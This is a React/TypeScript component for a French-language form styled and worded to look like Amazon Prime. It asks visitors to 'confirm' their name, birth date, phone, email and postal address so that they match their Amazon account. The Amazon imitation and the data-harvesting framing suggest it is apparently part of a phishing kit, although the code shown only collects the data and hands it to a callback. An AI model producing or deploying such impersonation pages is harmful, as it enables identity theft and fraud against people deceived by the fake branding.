import type { FormEvent, FormEventHandler } from 'react';

const formatBirthDate: FormEventHandler<HTMLInputElement> = event => {
  const input = event.currentTarget;
  const digits = input.value.replace(/\D/g, '').slice(0, 8);
  input.value = [digits.slice(0, 2), digits.slice(2, 4), digits.slice(4, 8)].filter(Boolean).join('/');
  input.setCustomValidity('');
  if (digits.length === 8) {
    const day = Number(digits.slice(0, 2));
    const month = Number(digits.slice(2, 4));
    const year = Number(digits.slice(4));
    const date = new Date(year, month - 1, day);
    const valid = date.getFullYear() === year && date.getMonth() === month - 1 && date.getDate() === day && date <= new Date();
    if (!valid) input.setCustomValidity('Saisissez une date de naissance valide et antérieure à aujourd’hui.');
  }
};

const formatPhone: FormEventHandler<HTMLInputElement> = event => {
  const input = event.currentTarget;
  const digits = input.value.replace(/\D/g, '').slice(0, 10);
  const groups = digits.length <= 4 ? [digits] : [digits.slice(0, 4), digits.slice(4, 6), digits.slice(6, 8), digits.slice(8, 10)];
  input.value = groups.filter(Boolean).join(' ');
};

const digitsOnly: FormEventHandler<HTMLInputElement> = event => {
  event.currentTarget.value = event.currentTarget.value.replace(/\D/g, '').slice(0, 5);
};

export type PersonalDetails = {
  nom: string;
  prenom: string;
  dateNaissance: string;
  telephone: string;
  email: string;
  adresse: string;
  codePostal: string;
  ville: string;
};

export function PersonalDetailsForm({ initial, onBack, onContinue }: { initial: PersonalDetails; onBack: () => void; onContinue: (details: PersonalDetails) => void }) {
  function submit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    if (!event.currentTarget.reportValidity()) return;
    const data = new FormData(event.currentTarget);
    onContinue({
      nom: String(data.get('nom') ?? ''),
      prenom: String(data.get('prenom') ?? ''),
      dateNaissance: String(data.get('date-naissance') ?? ''),
      telephone: String(data.get('telephone') ?? ''),
      email: String(data.get('email') ?? ''),
      adresse: String(data.get('adresse') ?? ''),
      codePostal: String(data.get('code-postal') ?? ''),
      ville: String(data.get('ville') ?? ''),
    });
  }

  return <>
    <h1 className="amz-prime-title">Confirmez vos informations personnelles</h1>
    <p className="amz-prime-lead">Ces informations sont nécessaires pour traiter votre demande Prime.</p>
    <p className="amz-prime-detail">Veuillez remplir tous les champs ci-dessous. Ils doivent correspondre aux données enregistrées sur votre compte Amazon.</p>
    <form className="amz-coordonnees-form" onSubmit={submit}>
      <FormSection title="Identité" hint="Nom et prénom tels qu'indiqués sur votre compte Amazon." layout="identity">
        <Field id="prenom" label="Prénom" defaultValue={initial.prenom} autoComplete="given-name" minLength={2} maxLength={50} pattern="[\p{L}'’ .-]{2,50}" title="Utilisez uniquement des lettres, espaces, apostrophes ou tirets."/>
        <Field id="nom" label="Nom" defaultValue={initial.nom} autoComplete="family-name" minLength={2} maxLength={50} pattern="[\p{L}'’ .-]{2,50}" title="Utilisez uniquement des lettres, espaces, apostrophes ou tirets."/>
        <Field id="date-naissance" label="Date de naissance" defaultValue={initial.dateNaissance} placeholder="JJ/MM/AAAA" autoComplete="bday" inputMode="numeric" maxLength={10} hint="Les barres obliques sont ajoutées automatiquement." pattern="[0-9]{2}/[0-9]{2}/[0-9]{4}" onInput={formatBirthDate}/>
      </FormSection>
      <FormSection title="Contact" hint="Pour vous envoyer la confirmation et vous joindre si nécessaire.">
        <Field id="telephone" label="Téléphone" defaultValue={initial.telephone} type="tel" autoComplete="tel" inputMode="tel" maxLength={13} placeholder="0470 12 34 56" hint="Les espaces sont ajoutés automatiquement." pattern="0[0-9]{3}( [0-9]{2}){3}" onInput={formatPhone}/>
        <Field id="email" label="Adresse e-mail" defaultValue={initial.email} type="email" autoComplete="email" maxLength={120}/>
      </FormSection>
      <FormSection title="Adresse" hint="Adresse postale associée à votre compte ou à votre abonnement.">
        <Field id="adresse" label="Adresse" defaultValue={initial.adresse} autoComplete="street-address" minLength={5} maxLength={120} placeholder="N° et nom de rue" full/>
        <Field id="code-postal" label="Code postal" defaultValue={initial.codePostal} autoComplete="postal-code" inputMode="numeric" maxLength={5} pattern="[0-9]{5}" placeholder="75001" onInput={digitsOnly}/>
        <Field id="ville" label="Ville" defaultValue={initial.ville} autoComplete="address-level2" minLength={2} maxLength={80} pattern="[\p{L}'’ .-]{2,80}" placeholder="Paris" title="Utilisez uniquement des lettres, espaces, apostrophes ou tirets."/>
      </FormSection>
      <div className="amz-actions"><button className="amz-btn amz-btn--primary" type="submit">Continuer</button><button className="amz-btn amz-btn--secondary" type="button" onClick={onBack}>Retour</button></div>
    </form>
  </>;
}

function FormSection({ title, hint, layout, children }: { title: string; hint: string; layout?: 'identity'; children: React.ReactNode }) {
  return <section className="amz-form-section"><header className="amz-form-section__head"><h2 className="amz-form-section__title">{title}</h2><p className="amz-form-section__hint">{hint}</p></header><div className={`amz-form-grid${layout ? ` amz-form-grid--${layout}` : ''}`}>{children}</div></section>;
}

type FieldProps = React.InputHTMLAttributes<HTMLInputElement> & { id: string; label: string; hint?: string; full?: boolean };
function Field({ id, label, hint, full, ...inputProps }: FieldProps) {
  return <div className={`amz-field${full ? ' amz-field--full' : ''}`}><label htmlFor={id}>{label} <span className="req">*</span></label><input className="amz-input" id={id} name={id} required {...inputProps}/>{hint && <p className="amz-field-hint">{hint}</p>}</div>;
}
